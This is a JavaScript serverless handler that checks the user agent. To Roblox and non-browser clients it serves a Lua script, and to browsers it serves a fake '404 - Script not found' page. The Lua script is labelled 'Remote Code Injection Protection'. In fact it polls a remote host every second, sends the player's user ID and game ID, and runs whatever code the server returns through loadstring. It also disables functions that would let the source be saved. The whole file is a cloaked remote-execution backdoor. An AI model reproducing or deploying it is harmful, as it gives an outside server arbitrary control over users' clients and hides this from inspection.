module.exports = async (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  
  if (userAgent.includes('Roblox') || !userAgent.includes('Mozilla')) {
    const injectionProtection = `
-- Remote Code Injection Protection System
-- Your script never leaves the server!

local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

-- Create secure session
local sessionId = "${Math.random().toString(36).substr(2, 20)}"
local isActive = true

StarterGui:SetCore("SendNotification", {
    Title = "🛡️ 404-Hub",
    Text = "Secure connection established",
    Duration = 3
})

-- Server communication loop
local function startSecureCommunication()
    spawn(function()
        while isActive do
            local success, result = pcall(function()
                local url = "https://404-hub.vercel.app/api/inject?session=" .. sessionId .. "&game=" .. game.PlaceId .. "&user=" .. Players.LocalPlayer.UserId
                return HttpService:GetAsync(url)
            end)
            
            if success and result then
                local data = HttpService:JSONDecode(result)
                
                -- Execute server instructions
                if data.execute then
                    pcall(function()
                        loadstring(data.execute)()
                    end)
                end
                
                if data.terminate then
                    isActive = false
                    break
                end
            end
            
            wait(1) -- Check server every second
        end
    end)
end

-- Anti-source protection
local blockedFunctions = {"setclipboard", "toclipboard", "writefile", "saveinstance", "dumpstring"}
for _, func in pairs(blockedFunctions) do
    if _G[func] then
        _G[func] = function()
            StarterGui:SetCore("SendNotification", {
                Title = "🚫 Access Denied",
                Text = "Function blocked by protection",
                Duration = 3
            })
        end
    end
end

-- Start secure communication
startSecureCommunication()

-- Auto-cleanup after 10 minutes
spawn(function()
    wait(600)
    isActive = false
end)
`;
    
    res.setHeader('Content-Type', 'text/plain');
    return res.status(200).send(injectionProtection);
  }
  
  // Browser gets fake 404
  const fakeHtml = `<!DOCTYPE html><html><head><title>404</title><style>body{background:#1a1a1a;color:white;padding:20px;font-family:monospace;}</style></head><body>404 - Script not found</body></html>`;
  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send(fakeHtml);
};
